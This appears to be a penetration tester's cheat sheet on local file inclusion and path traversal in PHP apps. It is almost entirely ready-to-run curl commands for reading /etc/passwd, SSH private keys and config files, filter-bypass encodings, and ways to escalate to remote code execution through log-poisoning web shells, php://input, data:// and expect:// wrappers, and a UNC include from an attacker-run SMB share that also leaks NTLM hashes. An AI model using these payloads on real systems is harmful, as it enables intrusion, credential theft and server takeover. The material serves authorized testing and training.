# LFI / path traversal

Related: [rfi.md](rfi.md)

## Confirm
```bash
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=does-not-exist-12345'
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=../../../../etc/passwd'
curl --path-as-is 'http://<IP>/download/../../etc/passwd'   # input in URL path
```
- Compare with the missing-file response; confirm by file content. Errors may reveal prepended dir / appended extension.

## Files worth trying
```text
Linux:   /etc/passwd  /etc/hostname  /proc/self/status  /proc/self/cmdline
         /proc/self/environ  /proc/self/cwd/index.php
         /var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
Windows: C:\Windows\win.ini  C:\inetpub\wwwroot\web.config
         C:\Windows\System32\drivers\etc\hosts  C:\xampp\apache\conf\httpd.conf
         C:\xampp\apache\logs\access.log  C:\Users\<USER>\.ssh\id_rsa
SSH key: /home/<USER>/.ssh/id_rsa  /root/.ssh/id_rsa   (chmod 600 before use)
Config:  /etc/apache2/sites-enabled/000-default.conf
         /opt/tomcat/conf/tomcat-users.xml
```

## Filtered traversal
```text
/etc/passwd                    absolute path
....//....//etc/passwd         ../ stripped once
%2e%2e%2fetc%2fpasswd          encoded
%252e%252e%252fetc%252fpasswd  double-encoded
```
- Put `%` bytes directly in the URL; `--data-urlencode` would re-encode them.

## PHP source
```bash
curl -sS -G 'http://<IP>/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php'
printf '%s' '<BASE64>' | base64 -d
```

## LFI → RCE (PHP include only)
Log poisoning (also `/var/log/nginx/access.log`, `/var/log/httpd/access_log`):

```bash
curl -sS -A '<?php echo shell_exec($_GET["cmd"]); ?>' 'http://<IP>/'
curl -sS -G 'http://<IP>/index.php' \
  --data-urlencode 'page=../../../../var/log/apache2/access.log' \
  --data-urlencode 'cmd=id'
```
Other controlled files:

```text
/var/lib/php/sessions/sess_<PHPSESSID>   /var/lib/php5/sess_<PHPSESSID>   /tmp/sess_<PHPSESSID>
saved upload path
```
`php://input` (needs `allow_url_include`):

```bash
curl -sS -X POST 'http://<IP>/index.php?page=php://input&cmd=id' \
  --data-binary '<?php system($_GET["cmd"]); ?>'
```
- Confirm with `id` output; literal PHP source = file read, not execution.

## SSH and FTP log poisoning
Readable `auth.log`: log in with PHP as the username, then include the log.

```bash
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
curl -sG 'http://<IP>/index.php' \
  --data-urlencode 'page=../../../../var/log/auth.log' --data-urlencode 'cmd=id'
```
- Same idea: `/var/log/vsftpd.log` (FTP username), `/var/log/mail.log` (SMTP). Needs the log readable by the web user.
- The log must be intact: one broken PHP tag poisons it until rotated.

## Wrappers
```bash
curl -sG 'http://<IP>/index.php' --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='
curl -sG 'http://<IP>/index.php' --data-urlencode 'page=expect://id'
```
- `data://` needs `allow_url_include`; `expect://` needs the `expect` extension (rare).
- An app-appended extension breaks `data://`; `php://filter` source reads still work.

## Windows target: UNC include
A Windows PHP host resolves a UNC path as a file (no `allow_url_include` needed) if outbound SMB works.

```bash
sudo impacket-smbserver -smb2support share /path/to/dir
curl -sG 'http://<IP>/index.php' --data-urlencode 'page=\\<KALI>\share\probe.php'
```
- A connection to Kali with no code run = fetched but not interpreted, or the share denied guest: use [authenticated SMB](../foothold/file-transfer.md#authenticated-smb-share).
- Also leaks a NetNTLMv2 for the web service account → [crack, not relay](../windows/ntlm.md).
